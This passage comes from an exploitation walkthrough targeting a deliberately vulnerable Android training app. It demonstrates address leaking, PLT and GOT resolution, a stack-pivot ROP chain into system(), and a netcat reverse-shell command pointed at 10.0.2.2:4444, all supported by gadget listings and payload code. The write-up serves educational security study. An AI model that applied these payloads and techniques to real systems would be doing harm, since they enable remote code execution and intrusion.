The problem is that we want to execute e.g. `execve` or similar, but this function is not referenced in the module itself. This is where the return address comes into play. On my machine, `art_quick_generic_jni_trampoline` is the function that calls `lookupExamples`. This may depend on, among other things, the way the function is specified in the java code, i.e. it could be static or non - static. In this case, the return address is `art_quick_generic_jni_trampoline+220`.

Running
```bash
$ readelf --wide --symbols libart.so | grep art_quick_generic_jni_trampoline
  7145: 000000000039fed0   378 FUNC    LOCAL  HIDDEN    14 art_quick_generic_jni_trampoline
```
gives the offset `0x39fed0`. Thus, the base address (mind *ASLR*) of `libart.so` is
```
0x730c0379ffac - 220 - 0x39fed0 = 0x730c03400000
```

From now on, all code in `libart.so` is also available to us. Remember that we can overwrite a function pointer, whose function is called with **two** parameters
1. `keyValue`: pointer to a user - controlled string
2. `<unknown>`: `NULL`

We could gamble and hope that `execve` works here, but most likely it will not. We again do not control enough parameters. Notice that looking for similar functions yields
```bash
$ readelf --wide --symbols libart.so | grep "exec"
   199: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND execv@LIBC (2)
   200: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND execve@LIBC (2)
   271: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _ZN3art10DupCloexecEi
  1304: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS exec_utils.cc
  8795: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND execv
  8796: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND execve
 10033: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _ZN3art10DupCloexecEi
```
Looking up `execv` reveals
```C
int execv(const char *pathname, char *const argv[]);
```

This time, lets try to at least get to the point where we can execute an arbitrary executable file that we provided, as is described in a [previous section](#alternative-idea-for-exploitation-of-useafterfreewritemodule).

The attentive reader might have noticed that `execv` does not have any offset, i.e. an offset of 0. Thus it will be resolved when the dynamic linker loads `libart.so`. To solve that issue, we just have to figure out to which location a call to `execv` transfers control. Introducing: `.plt`!

One way to find the offset and thus the address of `execv` is to search for calls of `execv` in the binary. It turns out that `ExecWithoutWait` calls `execv`. Disassembling it yields:
```
$ readelf --wide --symbols libart.so | grep ExecWithoutWait
    1305: 00000000004b6ac0   560 FUNC    LOCAL  DEFAULT   14 _ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE
gef➤  disassemble 0x4b6ac0 + 0x730c03400000
    ...
    0x0000730c038b6bf8 <+312>:	mov    rsi,QWORD PTR [rsp+0x20]
    0x0000730c038b6bfd <+317>:	mov    rdi,r14
    0x0000730c038b6c00 <+320>:	call   0x730c03e08f80   <--- symbol stub for execv
    0x0000730c038b6c05 <+325>:	jmp    0x730c038b6c14 <_ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE+340>
    ...
```

As we know the base address of `libart.so`, we can compute `0x730c03e08f80 - 0x730c03400000 = 0xa08f80`. If we uploaded a test client shell script that connects to `10.0.2.2:4444`, chose `key = "/data/local/tmp/client"` and `value=<address of execv>`, we would expect to get a connection...but unfortunately, execution gets denied with an error:
```
/com.damnvulnerableapp W/Thread-2: type=1400 audit(0.0:3799): avc: denied { execute } for name="client" dev="dm-5" ino=65602 scontext=u:r:untrusted_app:s0:c152,c256,c512,c768 tcontext=u:object_r:shell_data_file:s0 tclass=file permissive=0 app=com.damnvulnerableapp
```

### Trying to earn all the fruits

As you may have noticed, the above does not really help other than crashing the app. What we want is **arbitrary code execution**!!! Thus, we can try to transform the above UAF vulnerability into another vulnerability, e.g. a format string vulnerability that is easier to exploit!

Observe that there is a function called [`StringPrintf`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:system/libbase/stringprintf.cpp;l=68):
```C++
std::string StringPrintf(const char* fmt, ...) {
	va_list ap;
	va_start(ap, fmt);
	std::string result;
	StringAppendV(&result, fmt, ap);
	va_end(ap);
	return result;
}
```
which is a perfect target as we fully control the content of `key`! Using the same trick as above or by just disassembling the whole `.plt` and searching for `StringPrintf` will reveal that its offset is `0xa08570` (in `.plt`). Notice that `StringPrintf` internally calls `StringAppendV`, which again calls `vsnprintf`.

Therefore, set `key=<format string>` and `value=address of StringPrintf@plt`.

Testing this reveals that we might be able to use format strings like "%4242x", but not "%4242x%n", because of the implementation of [`vfprintf`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/libc/stdio/vfprintf.cpp;l=454;bpv=0;bpt=1):
```C
...
case 'n':
    __fortify_fatal("%%n not allowed on Android");
...
```
Also, for the above to work, we would need to adjust the call to `obj + 0x100` like:
```C
char buffer[32] = { 0 };
*(obj + 0x100)(buffer, keyValue);
```
because `StringPrintf` silently assumes that `rdi` is an address to a variable that has to store a result of `24` bytes and `rsi` is the format string. If we did not make the above change, then `StringPrintf` would zero out the first `24` bytes of our format string, thus completely shutting down the attack. Adding to the pile, we do not have any control over addresses that are accessible via direct parameter access. To be precise, we would need to be lucky enough to find any addresses of interest on the stack like e.g. the format string itself.

Another idea could be to call `dlopen` to get a reference to another library that provides more interesting functionality like `system`! The offset of the `.plt` - entry that calls `dlopen` is `0xa096b0`. Thus we can compute the overall virtual address. Unfortunately, this is shut down by the fact that `dlopen` returns a random `8` - byte value that is a key into a dictionary, whose values are the actual addresses of `soinfo` - structures, which again contain the base addresses. So it is pretty unlikely to get this right, the best we could do here is either guessing or trying to leak the dictionary via a global variable.


### Finally: the solution

Another approach is to try to exploit this UAF vulnerability via a ROP - chain. This is a very destructive approach, but lets see through this:
1. Find a gadget that, right before the call of our `obj + 0x100` function, modifies the stack in such a way that it will return to `keyValue`.
2. Put ROP - chain into `keyValue`. We may use at most `256 // 8 = 32` qwords. This might be sufficient to leak a `libc.so` address into a global variable in `libart.so`. It will turn out that this even suffices to get arbitrary, limited - length command execution.
3. Finally restore the old `rsp` and `rbp`. This would be necessary for a stealthy approach. Restoring `rsp` is only really important for calling `system`, because if `rsp` points into `keyValue`, which is located on the heap, `system` will allocate alot of memory from the heap as if it was a stack, therefore going out-of-bounds fast.

So, the gadget of choice is located at `0x39509a` and is of the form:
```
gef➤  x/10i 0x730c03400000 + 0x39509a
    0x730c0379509a <art_quick_do_long_jump+106>:	pop    rdi
    0x730c0379509b <art_quick_do_long_jump+107>:	pop    rsi
    0x730c0379509c <art_quick_do_long_jump+108>:	pop    rbp
    0x730c0379509d <art_quick_do_long_jump+109>:	add    rsp,0x8
    0x730c037950a1 <art_quick_do_long_jump+113>:	pop    rbx
    0x730c037950a2 <art_quick_do_long_jump+114>:	pop    rdx
    0x730c037950a3 <art_quick_do_long_jump+115>:	pop    rcx
    0x730c037950a4 <art_quick_do_long_jump+116>:	pop    rax
    0x730c037950a5 <art_quick_do_long_jump+117>:	pop    rsp
    0x730c037950a6 <art_quick_do_long_jump+118>:	ret
```

We can use the debugger to figure out how many qwords we need to pop in order for the `ret` - instruction to return to `keyValue`:
```
gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair
    ...
    0x0000730b9d3c8b5c <+252>:	mov    rax,QWORD PTR [rbp-0x70]
    0x0000730b9d3c8b60 <+256>:	mov    rax,QWORD PTR [rax+0x100]
    0x0000730b9d3c8b67 <+263>:	mov    rdi,QWORD PTR [rbp-0x78]   <--- keyValue
    0x0000730b9d3c8b6b <+267>:	xor    ecx,ecx
    0x0000730b9d3c8b6d <+269>:	mov    DWORD PTR [rbp-0xac],ecx
    0x0000730b9d3c8b73 <+275>:	mov    esi,ecx
=>  0x0000730b9d3c8b75 <+277>:	call   rax      <--- execution condition
    ...
gef➤  x/1gx $rbp-0x78
    0x730b9afdf818:	0x0000730cb77bb950
gef➤  x/10gx $rsp
0x730b9afdf7e0:	0x00000000990de82b	0x0000730d778087d0
0x730b9afdf7f0:	0x0000730b9afdfb00	0x0000730d77808880
0x730b9afdf800:	0x0000730b9afdfd60	0x0000730ca77f2750
0x730b9afdf810:	0x000000d09afdf8b0	0x0000730cb77bb950  <--- this is keyValue
0x730b9afdf820:	0x0000730cb77bb950	0x0000730c0379509c
```

So when we run into `call rax`, we push an additional return address onto the stack. Therefore we need to pop `1 + 7` qwords from the stack before we can shift the stack into `keyValue` and hit `ret`. So we need `rsp` to be `keyValue`, then the stack "changes" to our controlled ROP - chain. Therefore we can make use the *Execute* condition to run the above gadget, which will then trigger execution of the gadgets located in `keyValue`.

Now we will try to leak a `libc.so` address into a global variable in `libart.so`. This allows us to compute the `libc.so` base address, which in turn allows us to call `system` (the holy grail)! To that end, we will try to find a `libc.so` address in `libart.so`. The `.got.plt` is the best place to start looking. As Android's dynamic linker likes loading shared objects with `BIND_NOW` (which is probably motivated by *RELRO*), the `.got.plt` is already populated with the correct function addresses. This implies that the `.got.plt` entry of `_exit` contains the actual address of `_exit` in the `libc.so`. Computing the offset of `_exit`'s `.got.plt` entry yields `0xc1be50` (we could use any other function from `libc.so`; `_exit` was chosen arbitrarily).

Observe that we only need 6 qwords to leak `system`:
```python
# Leak exit@libc into rax
payload += gadget_pop_rdi
payload += address_got_plt_exit
payload += gadget_mov_rax_deref_rdi

# Put system@libc into rax
payload += gadget_pop_rcx
payload += p64(offset__exit - offset_system) # --> offset__exit >= offset_system (just testing)
payload += gadget_sub_rax_rcx
```

After the above, `rax` will contain the address of `system@libc`. Setting up the command to execute can be done by writing to a writable memory area in `libart.so` (hope that this does not crash; otherwise choose another area until it works). Writing the command could look like this:
```python
payload += gadget_pop_rdi
payload += address_writable_memory
payload += gadget_pop_rcx
payload += b'nc 10.0.'
payload += gadget_mov_deref_rdi_rcx
```

Finally, we want to call `system@libc`, whose address is stored in `rax`. The main problem here is that just calling `system` will most likely crash the app, because `rsp` still points into the heap. If `system` uses a lot of stack memory, this will eventually invalidate heap chunks or trigger *anti - out - of - bounds* security mechanisms. Therefore, we need to restore `rsp` s.t. it points into a sufficiently large memory area that is assumed to be used by "user - code", i.e. e.g. the original stack. Observe that the [leaked addresses](#leaking-data) contained a stack pointer. We can go ahead and write the address of `system@libc` into that address and then restore the stack with a `pop rsp; ret`:
```python
# Write address of system@got.plt to stack address. rdi currently contains the command string!
payload += gadget_pop_rcx
payload += address_stack
payload += gadget_mov_deref_rcx_rax # <-- rax = system@libc

# Restore stack. This gadget implicitly calls system
payload += gadget_pop_rsp
payload += address_stack
```

This exploit is **very** specific to this module, but it uses a technique that shifts the stack into a user - controlled memory region s.t. successive `ret` - instructions result in execution of ROP - gadgets.

## Coming back from *UseAfterFreeExecModule*

The technique used to exploit the UAF vulnerability in the *UseAfterFreeExecModule* might be applicable to *libUseAfterFreeWriteModule* aswell. General steps are:
1. Setup a ROP - chain in readable/writeable memory area. In this case, this will be in a shared memory region somewhere is `libart.so`.
2. Next, overwrite `rsp` to point to the above mentioned memory region. Then immediately return using `ret`.
3. Enjoy the ROP - chain

It turns out that this does not work by itself. As we can only write one qword in each function call, we can either overwrite the return address to trigger execution of e.g. a gadget or set the stack pointer, but **not** both at once. Therefore, we need to do a little magic to make things work.

The key observation is that `rbp` is often used to restore `rsp` in function epilogues. This is precisely what happens in the caller of `storePair`! See the following assembly of `storePair`:
```
gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair 
    ...
    0x0000730b9ed59abd <+205>:	mov    rcx,QWORD PTR [rbp-0x50]
    0x0000730b9ed59ac1 <+209>:	mov    rax,QWORD PTR [rbp-0x58]
    0x0000730b9ed59ac5 <+213>:	mov    rax,QWORD PTR [rax]
    0x0000730b9ed59ac8 <+216>:	mov    QWORD PTR [rax],rcx      <--- write - what - where condition
    0x0000730b9ed59acb <+219>:	mov    rdi,QWORD PTR [rbp-0x38]
    0x0000730b9ed59acf <+223>:	mov    rax,QWORD PTR [rdi]
    0x0000730b9ed59ad2 <+226>:	mov    rax,QWORD PTR [rax+0x600]
    0x0000730b9ed59ad9 <+233>:	mov    rsi,QWORD PTR [rbp-0x48]
    0x0000730b9ed59add <+237>:	mov    rdx,QWORD PTR [rbp-0x70]
    0x0000730b9ed59ae1 <+241>:	mov    ecx,0x2
    0x0000730b9ed59ae6 <+246>:	call   rax
    0x0000730b9ed59ae8 <+248>:	mov    rdi,QWORD PTR [rbp-0x60]
    0x0000730b9ed59aec <+252>:	call   0x730b9ed59b90 <free@plt>
    0x0000730b9ed59af1 <+257>:	mov    rax,QWORD PTR fs:0x28
    0x0000730b9ed59afa <+266>:	mov    rcx,QWORD PTR [rbp-0x8]
    0x0000730b9ed59afe <+270>:	cmp    rax,rcx
    0x0000730b9ed59b01 <+273>:	jne    0x730b9ed59b0d <Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair+285>
    0x0000730b9ed59b07 <+279>:	add    rsp,0x70
    0x0000730b9ed59b0b <+283>:	pop    rbp               <--- restore old rbp of calling function
    0x0000730b9ed59b0c <+284>:	ret    
```

It is clear that in between the *Write - What - Where* condition and the `pop rbp` - instruction there are no references to the stored old `rbp` of the calling function. Therefore, we can "safely" overwrite it. But why would we do this? Consider what happens after we return from `storePair`:
```
gef➤  x/35i 0x0000730c0379ffa9
    0x730c0379ffa9:	call   r11
    0x730c0379ffac:	mov    rdi,QWORD PTR gs:0xe0    <--- we return here
    0x730c0379ffb5:	mov    rsi,rax
    0x730c0379ffb8:	movq   rdx,xmm0
    0x730c0379ffbd:	call   0x730c03d62b00 <artInvokeInterfaceTrampolineWithAccessCheck+208>
    0x730c0379ffc2:	mov    rcx,QWORD PTR gs:0xa0
    0x730c0379ffcb:	test   rcx,rcx
    0x730c0379ffce:	jne    0x730c037a0034 <art_quick_read_barrier_mark_reg02+116>
    0x730c0379ffd0:	mov    rsp,rbp                  <--- how convenient!
    0x730c0379ffd3:	movq   xmm1,QWORD PTR [rsp+0x18]
    0x730c0379ffd9:	movq   xmm2,QWORD PTR [rsp+0x20]
    0x730c0379ffdf:	movq   xmm3,QWORD PTR [rsp+0x28]
    0x730c0379ffe5:	movq   xmm4,QWORD PTR [rsp+0x30]
    0x730c0379ffeb:	movq   xmm5,QWORD PTR [rsp+0x38]
    0x730c0379fff1:	movq   xmm6,QWORD PTR [rsp+0x40]
    0x730c0379fff7:	movq   xmm7,QWORD PTR [rsp+0x48]
    0x730c0379fffd:	movq   xmm12,QWORD PTR [rsp+0x50]
    0x730c037a0004:	movq   xmm13,QWORD PTR [rsp+0x58]
    0x730c037a000b:	movq   xmm14,QWORD PTR [rsp+0x60]
    0x730c037a0012:	movq   xmm15,QWORD PTR [rsp+0x68]
    0x730c037a0019:	add    rsp,0x70
    0x730c037a001d:	pop    rcx
    0x730c037a001e:	pop    rdx
    0x730c037a001f:	pop    rbx
    0x730c037a0020:	pop    rbp
    0x730c037a0021:	pop    rsi
    0x730c037a0022:	pop    r8
    0x730c037a0024:	pop    r9
    0x730c037a0026:	pop    r12
    0x730c037a0028:	pop    r13
    0x730c037a002a:	pop    r14
    0x730c037a002c:	pop    r15
    0x730c037a002e:	movq   xmm0,rax
    0x730c037a0033:	ret    
```
So if we were to pass the function call `call 0x730c03d62b00` and `rcx = 0`, then we reach `mov rsp, rbp`, where `rbp` can be a value of our choice if we decide to overwrite the old rbp! After `rsp` has been set, we can see that we have a lot of references to `rsp` in order to restore the registers. So in addition to our ROP - chain, we need to ensure that there is a region of size `0x70 + 11 * 0x8` of accessible memory. The content of the accessible memory region can be anything, although we could use it to make an initial setup for the registers. Right after that region, we can place our ROP - chain, as `rsp` will point to `rbp + 0x70 + 11 * 0x8 = rbp + 0xc8`. Once we hit the ROP - chain, we can continue as usual in order to set up a command for `system` etc.

Once we want to call `system` we need to restore the stack in order to make segmentation faults etc. less likely (remember that `rsp` is currently pointing to some globally accessible memory region, e.g. `.bss`. We do **not** want our stack to be there forever!). To that end we write the address of `system` to the stack pointer that was leaked by `lookupExamples`, set `rsp` to that address and call `pop rsp; ret`:
```python
# Up to this point, rsp still points into .bss! This will most likely crash the app while calling system! Thus try to reset rsp by abusing the stack pointer leak. We will set rsp to the leaked address, but before we will set the stack value at that leaked address to system@libc! Thus we can use a pop rsp; ret gadget.
# Write address of system@got.plt to stack address. rdi currently contains the command string!
payload += gadget_pop_rcx
payload += address_stack
payload += gadget_mov_deref_rcx_rax

# Restore stack
payload += gadget_pop_rsp
payload += address_stack
```

There is only one problem remaining, i.e. when monitoring the exploit with *gdb*, we can observe that the ROP - chain might execute perfectly fine. But if we try to run the exploit without any debugger attached, it most likely does not work (at least in my case). There may be multiple reasons for that, among which the most probable ones are:
1. *gdb* shifts the stack, because it stores debug information or similar
2. *gdb* prevents the app from using certain global variables s.t. overwriting them with *gdb* attached results in no error.

It turns out that the first hypothesis is most likely true! To that end, we can try to brute - force over a finite set of possible stack shifts like so:
```python
address_old_rbp = p64(u64(leak[4]) - 0x240 + 0x8 * (rbp_shift))
```
where
- `leak[4]` is the stack address leak
- `- 0x240` is the offset of the leaked stack address to the address of the old `rbp` when *gdb* is attached
- `+ 0x8 * rbp_shift` shift to try for this run of the exploit. As we are "missing" *gdb*, it is very probable that there is less data on the stack, thus we increment the stack address.

A big problem could be that both of the above reasons are true. Thus, minizing the ROP - chain we write into global memory can be very helpful to rule out the second reason as much as possible. E.g. we could use a ROP - chain that just calls `sleep(42)`. Then brute - force over all shifts until the app blocks. The shift that caused a block (longer than usual execution times, i.e. it might not block for all `42` seconds, because other threads might try to use overwritten global variables, which probably crashes the app!) is most likely the shift we were looking for.

## Summary

It has been a long journey to get to *arbitrary code execution*, but in the end it worked! We abused the fact that there are no bounds checks for `rsp`, which allowed for redirecting the stack into attacker - controlled memory regions. This again triggered the execution of a ROP - chain.

An upgrade to the above attack would be to use a single ROP - chain that triggers execution of `mmap` and stores the result in a writable memory region. Then, using the *Write - What - Where* condition, we could fill the new memory region with arbitrary shellcode. Finally, we can overwrite the return address to redirect control flow into the shellcode.